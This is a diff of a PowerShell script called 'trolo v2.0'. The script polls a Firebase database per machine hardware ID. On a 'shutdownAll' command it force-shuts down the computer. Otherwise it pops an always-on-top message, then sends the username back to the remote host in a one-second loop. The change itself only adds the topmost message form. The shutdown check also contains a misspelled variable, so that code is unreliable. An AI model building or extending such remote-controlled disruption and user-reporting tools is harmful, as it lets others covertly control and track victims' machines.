@@ -20,12 +20,19 @@ Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main.jso
 if ($respone.$hwid.message -eq "shutdownAll") {
 shutdown.exe /s /t 0 /f
 } else {
+$topForm = New-Object System.Windows.Forms.Form
+$topForm.TopMost = $true
+$topForm.ShowInTaskbar = $false
+$topForm.WindowState = 'Minimized'
+
 [System.Windows.Forms.MessageBox]::Show(
-$response.$hwid.message,
-"trolo v2.0",
-[System.Windows.Forms.MessageBoxButtons]::OK,
-[System.Windows.Forms.MessageBoxIcon]::Information
+    $topForm,
+    $response.$hwid.message,
+    "trolo v2.0",
+    [System.Windows.Forms.MessageBoxButtons]::OK,
+    [System.Windows.Forms.MessageBoxIcon]::Information
 )
+$topForm.Dispose()
 }
 $body = @{
 username = $username
@@ -46,3 +53,4 @@ message = ""
 Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main/$hwid.json" -Method Patch -Body $body -ContentType "application/json"
 Start-Sleep -Seconds 1
 }
+
